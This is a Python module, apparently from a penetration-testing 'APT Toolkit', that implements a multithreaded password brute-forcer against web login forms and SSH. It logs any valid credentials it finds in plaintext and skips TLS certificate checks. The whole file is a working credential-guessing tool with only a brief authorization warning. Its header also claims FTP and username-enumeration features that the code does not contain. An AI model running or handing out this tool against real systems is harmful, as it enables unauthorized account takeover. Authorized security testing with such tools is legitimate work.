"""
Brute Force Module for APT Toolkit

Features:
- Password brute force attacks
- Username enumeration
- Rate limiting
- Lockout detection
- Multiple protocol support
- Thread-safe operation

WARNING: This module should only be used on systems you own or have explicit permission to test.
Unauthorized brute force attacks are illegal in most jurisdictions.
"""

import time
import threading
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor
from enum import Enum, auto
import requests
import paramiko
from urllib.parse import urljoin

from src.core.engine import ScanModule, ScanTarget, ScanResult, ScanStatus
from src.utils.logger import get_logger
from src.utils.network import NetworkHelpers
from src.utils.config import config
from src.core.event_system import event_system, Event
from src.utils.helpers import ErrorHelpers

logger = get_logger(__name__)

class ProtocolType(Enum):
    """Supported protocol types"""
    HTTP_FORM = auto()
    SSH = auto()
    FTP = auto()

class BruteForceResult(Enum):
    """Brute force attempt results"""
    SUCCESS = auto()
    FAILURE = auto()
    LOCKOUT = auto()
    ERROR = auto()

class BruteForcer(ScanModule):
    """Brute force attack module"""
    
    def __init__(self):
        super().__init__()
        self.module_name = "bruteforce"
        self.timeout = config.auth.request_timeout
        self.max_threads = config.auth.max_threads
        self.delay = config.auth.attempt_delay
        self._stop_event = threading.Event()
        
    def initialize(self) -> None:
        """Initialize brute forcer resources"""
        logger.info(f"Initialized {self.module_name} with {self.max_threads} threads")
        
    def cleanup(self) -> None:
        """Cleanup brute forcer resources"""
        self._stop_event.set()
        logger.info(f"Cleaned up {self.module_name}")
        
    def validate_target(self, target: ScanTarget) -> bool:
        """Validate target is appropriate for brute force"""
        if not target.host:
            return False
        return True
        
    def _try_http_login(self, url: str, data: Dict[str, str], success_indicator: str) -> BruteForceResult:
        """Attempt HTTP form login"""
        try:
            response = requests.post(
                url,
                data=data,
                timeout=self.timeout,
                allow_redirects=False,
                verify=False
            )
            
            if success_indicator in response.text:
                return BruteForceResult.SUCCESS
            elif "locked" in response.text or "disabled" in response.text:
                return BruteForceResult.LOCKOUT
            return BruteForceResult.FAILURE
        except requests.exceptions.RequestException:
            return BruteForceResult.ERROR
            
    def _try_ssh_login(self, host: str, port: int, username: str, password: str) -> BruteForceResult:
        """Attempt SSH login"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                banner_timeout=10
            )
            client.close()
            return BruteForceResult.SUCCESS
        except paramiko.AuthenticationException:
            return BruteForceResult.FAILURE
        except paramiko.SSHException as e:
            if "Too many authentication failures" in str(e):
                return BruteForceResult.LOCKOUT
            return BruteForceResult.ERROR
        except Exception:
            return BruteForceResult.ERROR
            
    def _try_credentials(self, target: ScanTarget, username: str, password: str) -> Dict[str, Any]:
        """Try a single credential pair"""
        result = {
            "username": username,
            "password": password,
            "result": BruteForceResult.FAILURE.name,
            "protocol": target.metadata.get("protocol", ProtocolType.HTTP_FORM.name),
            "time": time.time()
        }
        
        try:
            if self._stop_event.is_set():
                return result
                
            protocol = ProtocolType[target.metadata.get("protocol", "HTTP_FORM")]
            
            if protocol == ProtocolType.HTTP_FORM:
                login_data = target.metadata.get("form_data", {}).copy()
                login_data[target.metadata["username_field"]] = username
                login_data[target.metadata["password_field"]] = password
                
                attempt_result = self._try_http_login(
                    target.host,
                    login_data,
                    target.metadata.get("success_indicator", "")
                )
                result["result"] = attempt_result.name
                
            elif protocol == ProtocolType.SSH:
                attempt_result = self._try_ssh_login(
                    target.host,
                    target.metadata.get("port", 22),
                    username,
                    password
                )
                result["result"] = attempt_result.name
                
            # Add delay between attempts
            time.sleep(self.delay)
            
        except Exception as e:
            logger.error(f"Brute force attempt failed: {str(e)}")
            result["result"] = BruteForceResult.ERROR.name
            
        return result
        
    def execute(self, target: ScanTarget) -> ScanResult:
        """
        Execute brute force attack against target
        
        Args:
            target: ScanTarget specifying authentication endpoint and parameters
            
        Returns:
            ScanResult with brute force results
        """
        if not self.validate_target(target):
            logger.error(f"Invalid scan target: {target.host}")
            return ScanResult(
                target=target,
                data={"error": "Invalid target"},
                status=ScanStatus.FAILED
            )
            
        usernames = target.metadata.get("usernames", [])
        passwords = target.metadata.get("passwords", [])
        
        if not usernames or not passwords:
            logger.error("Missing usernames or passwords list")
            return ScanResult(
                target=target,
                data={"error": "Missing credentials list"},
                status=ScanStatus.FAILED
            )
            
        logger.info(f"Starting brute force attack on {target.host} with {len(usernames)} users and {len(passwords)} passwords")
        
        try:
            results = []
            success_count = 0
            self._stop_event.clear()
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                
                for username in usernames:
                    if self._stop_event.is_set():
                        break
                        
                    for password in passwords:
                        if self._stop_event.is_set():
                            break
                            
                        futures.append(
                            executor.submit(
                                self._try_credentials,
                                target,
                                username,
                                password
                            )
                        )
                        
                for future in futures:
                    if self._stop_event.is_set():
                        break
                        
                    try:
                        result = future.result()
                        results.append(result)
                        
                        if result["result"] == BruteForceResult.SUCCESS.name:
                            success_count += 1
                            logger.info(f"Found valid credentials: {result['username']}:{result['password']}")
                            
                        if result["result"] == BruteForceResult.LOCKOUT.name:
                            logger.warning(f"Account lockout detected for {result['username']}")
                            self._stop_event.set()
                            
                    except Exception as e:
                        logger.error(f"Brute force attempt failed: {str(e)}")
                        
            return ScanResult(
                target=target,
                data={
                    "successful": success_count,
                    "attempts": len(results),
                    "results": results,
                    "stats": {
                        "success_rate": success_count / max(1, len(results)),
                        "lockouts": len([r for r in results if r["result"] == BruteForceResult.LOCKOUT.name]),
                        "errors": len([r for r in results if r["result"] == BruteForceResult.ERROR.name])
                    }
                },
                status=ScanStatus.COMPLETED
            )
            
        except Exception as e:
            logger.error(f"Brute force attack failed on {target.host}: {str(e)}", exc_info=True)
            return ScanResult(
                target=target,
                data={"error": str(e)},
                status=ScanStatus.FAILED
            )

# Module registration
def init_module():
    return BruteForcer()

# Example usage:
# bruteforcer = BruteForcer()
# target = ScanTarget(
#     host="http://example.com/login",
#     metadata={
#         "protocol": "HTTP_FORM",
#         "username_field": "username",
#         "password_field": "password",
#         "success_indicator": "Welcome",
#         "usernames": ["admin", "user"],
#         "passwords": ["password", "123456"]
#     }
# )
# result = bruteforcer.execute(target)
# print(json.dumps(result.data, indent=2))